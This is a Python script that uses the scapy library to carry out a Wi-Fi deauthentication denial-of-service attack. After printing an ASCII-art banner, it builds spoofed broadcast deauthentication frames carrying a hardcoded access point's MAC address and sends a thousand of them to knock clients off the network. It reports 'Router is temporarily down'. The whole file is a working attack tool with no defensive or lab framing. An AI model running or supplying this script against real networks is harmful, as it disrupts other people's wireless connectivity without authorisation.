from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

def deauth_attack(target_bssid, iface="wlx00873450464c", count=1000, interval=0.1):
    try:
        print("")
        print("")
        print("")
        print("██████╗░██╗░░░██╗███████╗░██████╗██╗░░░██╗███████╗██████╗░░█████╗░██████╗░")
        print("██╔══██╗██║░░░██║██╔════╝██╔════╝██║░░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗")
        print("██████╦╝██║░░░██║█████╗░░╚█████╗░██║░░░██║█████╗░░██████╔╝██║░░██║██████╔╝")
        print("██╔══██╗██║░░░██║██╔══╝░░░╚═══██╗██║░░░██║██╔══╝░░██╔══██╗██║░░██║██╔═══╝░")
        print("██████╦╝╚██████╔╝███████╗██████╔╝╚██████╔╝███████╗██║░░██║╚█████╔╝██║░░░░░")
        print("╚═════╝░░╚═════╝░╚══════╝╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░░░░")
        
        time.sleep(1)  # Wait for a second before starting the attack

        print("Wi-Fi DoS Attack: Disrupting the Wi-Fi network...")
        print(f"Target MAC Address: {target_bssid}")
        print("Sending deauthentication packets...")

        # Create a deauthentication frame targeting the access point
        packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

        # Send the deauthentication frame
        print("Sending deauthentication packets...")
        for i in range(count):
            sendp(packet, iface=iface, inter=interval, verbose=False)
            print(".", end="", flush=True)  # Print a dot to indicate progress
        print("\nDoS attack completed successfully.\nRouter is temporarily down.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    # Define the target MAC address of the Wi-Fi router (access point)
    target_bssid = "82:A6:5F:68:D1:99"  # Replace with the MAC address of the target access point

    # Perform deauthentication attack targeting the Wi-Fi router
    deauth_attack(target_bssid)

